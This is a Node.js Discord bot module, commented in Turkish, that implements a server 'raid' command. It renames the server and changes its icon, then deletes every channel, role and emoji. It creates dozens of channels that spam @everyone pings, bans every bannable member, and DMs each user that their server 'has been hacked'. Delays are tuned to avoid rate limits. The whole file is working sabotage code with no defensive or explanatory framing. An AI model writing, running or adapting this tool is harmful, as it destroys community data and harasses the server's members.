const configuration = require('../configuration.json');

// --- HIZ AYARLARI (Optimal Değerler) ---
// Kanal ve Rol işlemleri arasındaki bekleme süresi (milisaniye).
const CHANNEL_ROLE_DELAY_MS = 350; 
// Üye yasaklama işlemleri arasındaki bekleme süresi.
const BAN_DELAY_MS = 250;
// Ping ve DM gönderme gibi en hassas işlemler arasındaki bekleme süresi.
const DM_PING_DELAY_MS = 600;

/**
 * Belirtilen süre kadar bekleyen bir yardımcı fonksiyon.
 * @param {number} ms - Beklenecek milisaniye.
 */
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

module.exports = async (message) => {
    try {
        const args = message.content.toLowerCase().trim().split(/ +/g);
        const raidName = args[1] || "Raiding";
        const amount = parseInt(args[2]) || 50;

        message.delete().catch(() => {});

        console.log(`[OPTİMAL RAID BAŞLATILDI] Sunucu: ${message.guild.name} (${message.guild.id})`);
        
        //? Adım 1: Sunucu Ayarları ve Toplu Silme İşlemleri (Hızlı Başlangıç)
        console.log("[1/5] Sunucu ayarları yapılıyor ve mevcut içerik toplu siliniyor...");
        await Promise.allSettled([
            message.guild.setName(raidName).catch(err => console.log(`[HATA] Sunucu adı: ${err.message}`)),
            message.guild.setIcon(configuration.icon).catch(err => console.log(`[HATA] Sunucu ikonu: ${err.message}`)),
            ...message.guild.channels.cache.map(c => c.delete().catch(() => {})),
            ...message.guild.roles.cache.filter(r => r.editable && r.name !== '@everyone').map(r => r.delete().catch(() => {})),
            ...message.guild.emojis.cache.map(e => e.delete().catch(() => {}))
        ]);
        console.log("[BAŞARILI] Hızlı başlangıç adımı tamamlandı.");

        //? Adım 2: Kanalları Oluştur ve Ping At (Sıralı ve Optimize Gecikmeli)
        console.log(`[2/5] ${amount} kanal oluşturuluyor ve ping atılıyor...`);
        const pingMessage = `@everyone ||**${raidName}**||`;
        for (let i = 0; i < amount; i++) {
            try {
                const channel = await message.guild.channels.create(raidName, { type: 'GUILD_TEXT' });
                console.log(` -> Kanal oluşturuldu: ${channel.name} (${i + 1}/${amount})`);
                await channel.send(pingMessage);
            } catch (err) {
                console.log(`[HATA] Kanal oluşturma/ping atma başarısız: ${err.message}`);
            }
            // Her ping sonrası hassas gecikme, her kanal oluşturma sonrası normal gecikme uygulanır.
            // Ping daha önemli olduğu için onun gecikmesini baz alıyoruz.
            await delay(DM_PING_DELAY_MS);
        }
        console.log("[BAŞARILI] Kanal ve ping adımı tamamlandı.");

        //? Adım 3: Rolleri Oluştur (Sıralı ve Optimize Gecikmeli)
        console.log(`[3/5] ${amount} rol oluşturuluyor...`);
        for (let i = 0; i < amount; i++) {
            try {
                await message.guild.roles.create({ name: raidName, color: 'RANDOM', reason: 'Raid' });
                console.log(` -> Rol oluşturuldu: ${raidName} (${i + 1}/${amount})`);
            } catch (err) {
                console.log(`[HATA] Rol oluşturulamadı: ${err.message}`);
            }
            await delay(CHANNEL_ROLE_DELAY_MS);
        }
        console.log("[BAŞARILI] Rol oluşturma adımı tamamlandı.");

        //? Adım 4: Üyeleri Yasakla (Sıralı ve Hızlı Gecikmeli)
        console.log("[4/5] Tüm üyeler yasaklanıyor...");
        const membersToBan = Array.from(message.guild.members.cache.filter(m => m.bannable).values());
        let bannedCount = 0;
        for (const member of membersToBan) {
            await member.ban({ reason: raidName }).then(() => {
                bannedCount++;
                console.log(` -> Üye yasaklandı: ${member.user.tag} (${bannedCount}/${membersToBan.length})`);
            }).catch(err => console.log(`[HATA] ${member.user.tag} yasaklanamadı: ${err.message}`));
            await delay(BAN_DELAY_MS);
        }
        console.log(`[BAŞARILI] ${bannedCount} üye yasaklandı.`);

        //? Adım 5: Üyelere DM Gönder (Sıralı ve Güvenli Gecikmeli)
        console.log("[5/5] Üyelere özel mesaj gönderiliyor...");
        const membersToDm = Array.from(message.guild.members.cache.filter(m => !m.user.bot).values());
        let dmCount = 0;
        const dmMessage = `Sunucunuz "${message.guild.name}" hacklenmiştir. Mesaj: \`\`\`${raidName}\`\`\``;
        for (const member of membersToDm) {
            await member.send(dmMessage).then(() => {
                dmCount++;
                console.log(` -> DM gönderildi: ${member.user.tag} (${dmCount}/${membersToDm.length})`);
            }).catch(() => {});
            await delay(DM_PING_DELAY_MS);
        }
        console.log(`[BAŞARILI] ${dmCount} üyeye DM gönderilmeye çalışıldı.`);
        console.log("[RAID OPERASYONU TAMAMLANDI]");

    } catch (error) {
        console.error("[KRİTİK HATA] Raid işlemi sırasında beklenmedik bir hata oluştu:", error);
    }
};
        
